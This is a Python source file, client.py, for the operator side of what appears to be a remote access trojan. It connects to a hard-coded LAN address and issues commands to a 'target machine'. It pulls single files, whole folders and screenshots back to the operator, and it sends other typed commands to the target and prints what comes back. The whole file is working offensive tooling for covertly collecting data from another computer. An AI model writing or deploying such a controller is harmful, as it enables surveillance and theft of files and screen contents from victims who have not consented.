# client.py
import socket
import os

SERVER_IP = '192.168.143.12'  # Replace with the server's LAN IP address
PORT = 12345
BUFFER_SIZE = 4096
ss_count = 0   #screenshot count

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
    client_socket.connect((SERVER_IP, PORT))
    print("[+] Connected to server")
    
    while True:
        message = input("(type 'help_me' for extensive commands): ")
        
        if message.lower() == 'exit':
            break
        
        client_socket.sendall(message.encode())
############################################################################################
        if message.lower() == 'file':                                                       #file section
            
            file_name = input("File address : ").strip()
            client_socket.sendall(file_name.encode())

            filename = client_socket.recv(8192).decode()
            print("Receiving file:", filename)

            filesize = int(client_socket.recv(8192).decode())

            with open("received_" + filename, "wb") as f:
                received = 0
                while received < filesize:
                    data = client_socket.recv(min(8192, filesize - received))
                    if not data:
                        break
                    f.write(data)
                    received += len(data)

            print("File received and saved as:", "received_" + filename)
#############################################################################################
        elif message.lower() == 'folder':                                                    #folder section

            folder_name = input("Enter the folder address : ").strip()
            client_socket.sendall(folder_name.encode())

            save_folder = "received_folder"
            os.makedirs(save_folder, exist_ok=True)

            while True:
                filename = client_socket.recv(8192).decode()
                if filename == "DONE":
                    print("All files received.")
                    break
                print("Receiving file:", filename)
                client_socket.sendall(b"FILENAME RECEIVED")

                filesize = int(client_socket.recv(8192).decode())
                print("File size:", filesize, "bytes")
                client_socket.sendall(b"FILESIZE RECEIVED")

                file_path = os.path.join(save_folder, filename)
                os.makedirs(os.path.dirname(file_path), exist_ok=True)

                with open(file_path, "wb") as f:
                    received = 0
                    while received < filesize:
                        data = client_socket.recv(min(8192, filesize - received))
                        if not data:
                            break
                        f.write(data)
                        received += len(data)

                print(f"File '{filename}' received successfully!\n")
##########################################################################################
        elif message.lower() == 'ss':                                                     #screenshot
            filename = client_socket.recv(8192).decode()
            print("Receiving screenshot:", filename)

            filesize = int(client_socket.recv(8192).decode())

            with open("received_" + str(ss_count) + "_" + filename, "wb") as f:
                received = 0
                while received < filesize:
                    data = client_socket.recv(min(8192, filesize - received))
                    if not data:
                        break
                    f.write(data)
                    received += len(data)
            ss_count += 1

            print("screenshot received and saved as:", "screenshot_" + filename)
########################################################################################## 
        elif message.lower() == 'help_me':                                                   #help section
                print("ss : For taking a screenshot.")
                print("file : For copying file of target machine.")
                print("folder : For copying a hole folder of the target machine.")
                print("exit : To end the connection.")
##########################################################################################
        else:                                                                             #normal section
            data = client_socket.recv(8192)
            if not data:
                print("move on")
            else:
                print(data.decode())

    client_socket.close()
